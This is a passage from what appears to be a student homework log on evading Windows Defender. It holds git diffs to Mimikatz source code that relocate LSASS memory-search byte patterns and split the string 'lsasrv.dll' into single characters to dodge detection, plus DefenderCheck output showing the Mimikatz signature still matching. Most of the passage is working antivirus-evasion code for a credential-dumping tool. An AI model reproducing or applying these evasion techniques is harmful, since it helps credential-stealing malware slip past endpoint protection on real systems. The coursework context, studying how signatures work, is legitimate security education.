+		{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WN10_1709_Channel__ActualProcessEvent),	PTRN_WN10_1709_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {  0}},
+		{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_1803_Channel__ActualProcessEvent),	PTRN_WN10_1803_Channel__ActualProcessEvent},	{sizeof(PATC_W1803_Channel__ActualProcessEvent), PATC_W1803_Channel__ActualProcessEvent}, {-12}},
+		{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_1809_Channel__ActualProcessEvent),	PTRN_WN10_1809_Channel__ActualProcessEvent},	{sizeof(PATC_W1803_Channel__ActualProcessEvent), PATC_W1803_Channel__ActualProcessEvent}, {-12}},
+		{KULL_M_WIN_BUILD_10_2004,	{sizeof(PTRN_WN10_2004_Channel__ActualProcessEvent),	PTRN_WN10_2004_Channel__ActualProcessEvent},	{sizeof(PATC_W1803_Channel__ActualProcessEvent), PATC_W1803_Channel__ActualProcessEvent}, {-12}},
+	};
 #endif
-
-NTSTATUS kuhl_m_event_drop(int argc, wchar_t * argv[])
-{
 	kull_m_patch_genericProcessOrServiceFromBuild(EventReferences, ARRAYSIZE(EventReferences), L"EventLog", (MIMIKATZ_NT_MAJOR_VERSION < 6) ? L"eventlog.dll" : L"wevtsvc.dll", TRUE);
 	return STATUS_SUCCESS;
 }
diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c b/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
index 56ee10e..8c51454 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
@@ -685,15 +685,7 @@ NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
 	return status;
 }
 
-#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-BYTE PTRN_W2K8R2_DomainList[]	= {0xf3, 0x0f, 0x6f, 0x6c, 0x24, 0x30, 0xf3, 0x0f, 0x7f, 0x2d};
-BYTE PTRN_W2K12R2_DomainList[]	= {0x0f, 0x10, 0x45, 0xf0, 0x66, 0x48, 0x0f, 0x7e, 0xc0, 0x0f, 0x11, 0x05};
-BYTE PTRN_W2K16_DomainList[] = {0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xf1, 0xeb};
-KULL_M_PATCH_GENERIC DomainListReferences[] = {
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_W2K8R2_DomainList),	PTRN_W2K8R2_DomainList},	{0, NULL}, {10}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, { 8}},
-	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W2K16_DomainList),		PTRN_W2K16_DomainList},		{0, NULL}, {-4}},
-};
+
 NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 {
 	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
@@ -707,6 +699,15 @@ NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 		{
 			if(kuhl_m_sekurlsa_kdcsvc_package.Module.isPresent)
 			{
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
+				BYTE PTRN_W2K8R2_DomainList[] = { 0xf3, 0x0f, 0x6f, 0x6c, 0x24, 0x30, 0xf3, 0x0f, 0x7f, 0x2d };
+				BYTE PTRN_W2K12R2_DomainList[] = { 0x0f, 0x10, 0x45, 0xf0, 0x66, 0x48, 0x0f, 0x7e, 0xc0, 0x0f, 0x11, 0x05 };
+				BYTE PTRN_W2K16_DomainList[] = { 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xf1, 0xeb };
+				KULL_M_PATCH_GENERIC DomainListReferences[] = {
+					{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_W2K8R2_DomainList),	PTRN_W2K8R2_DomainList},	{0, NULL}, {10}},
+					{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, { 8}},
+					{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W2K16_DomainList),		PTRN_W2K16_DomainList},		{0, NULL}, {-4}},
+				};
 				if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, DomainListReferences, ARRAYSIZE(DomainListReferences), &aLsass.address, NULL, NULL, NULL))
 				{
 					if(kull_m_memory_copy(&data, &aLsass, sizeof(PVOID)))
```
### 28.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1422336 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x149D63 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 FF   ···············ÿ
00000010   7F 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ···············
00000020   00 14 00 00 00 00 00 00  00 00 00 00 00 FA 00 00   ·············ú··
00000030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000060   00 00 00 00 00 00 00 00  00 00 00 00 00 FE FF FF   ·············þÿÿ
00000070   7F FF FF FF 7F 00 00 00  00 00 00 00 00 CC 24 08   ÿÿÿ········Ì$·
00000080   40 01 00 00 00 E8 BC 14  40 01 00 00 00 E8 BC 14   @····è¼·@····è¼·
00000090   40 01 00 00 00 F8 BC 14  40 01 00 00 00 F8 BC 14   @····ø¼·@····ø¼·
000000A0   40 01 00 00 00 08 BD 14  40 01 00 00 00 08 BD 14   @·····½·@·····½·
000000B0   40 01 00 00 00 08 00 09  00 00 00 00 00 A8 7E 11   @············¨~·
000000C0   40 01 00 00 00 01 02 00  00 07 00 00 00 00 02 00   @···············
000000D0   00 07 00 00 00 08 02 00  00 07 00 00 00 06 02 00   ················
000000E0   00 07 00 00 00 07 02 00  00 07 00 00 00 6C 00 73   ·············l·s
000000F0   00 61 00 73 00 72 00 76  00 2E 00 64 00 6C 00 6C   ·a·s·r·v·.·d·l·l
```


## 29.patch
### 29.1: git diff -p
```diff --git a/files/mimikatz/mimilove/mimilove.c b/files/mimikatz/mimilove/mimilove.c
index 09d705e..07bc389 100644
--- a/files/mimikatz/mimilove/mimilove.c
+++ b/files/mimikatz/mimilove/mimilove.c
@@ -103,7 +103,8 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 		L"========================================\n\n"
 		);
 
-	if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"lsasrv.dll", &miLsasrv))
+	wchar_t lsasi[] = { L'l', L's', L'a', L's', L'r', L'v', L'.', L'd', L'l', L'l', 0x0 };
+	if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, lsasi, &miLsasrv))
 	{
 		if(kuhl_m_sekurlsa_utils_love_search(&miLsasrv, &paLsasrv, (PVOID *) &LogonSessionTable))
 		{
```
### 29.2: test.bat
c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1422336 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x149D63 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 FF   ···············ÿ
00000010   7F 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ···············
00000020   00 14 00 00 00 00 00 00  00 00 00 00 00 FA 00 00   ·············ú··
00000030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000060   00 00 00 00 00 00 00 00  00 00 00 00 00 FE FF FF   ·············þÿÿ
00000070   7F FF FF FF 7F 00 00 00  00 00 00 00 00 CC 24 08   ÿÿÿ········Ì$·
00000080   40 01 00 00 00 E8 BC 14  40 01 00 00 00 E8 BC 14   @····è¼·@····è¼·
00000090   40 01 00 00 00 F8 BC 14  40 01 00 00 00 F8 BC 14   @····ø¼·@····ø¼·
000000A0   40 01 00 00 00 08 BD 14  40 01 00 00 00 08 BD 14   @·····½·@·····½·
000000B0   40 01 00 00 00 08 00 09  00 00 00 00 00 A8 7E 11   @············¨~·
000000C0   40 01 00 00 00 01 02 00  00 07 00 00 00 00 02 00   @···············
000000D0   00 07 00 00 00 08 02 00  00 07 00 00 00 06 02 00   ················
000000E0   00 07 00 00 00 07 02 00  00 07 00 00 00 6C 00 73   ·············l·s
000000F0   00 61 00 73 00 72 00 76  00 2E 00 64 00 6C 00 6C   ·a·s·r·v·.·d·l·l

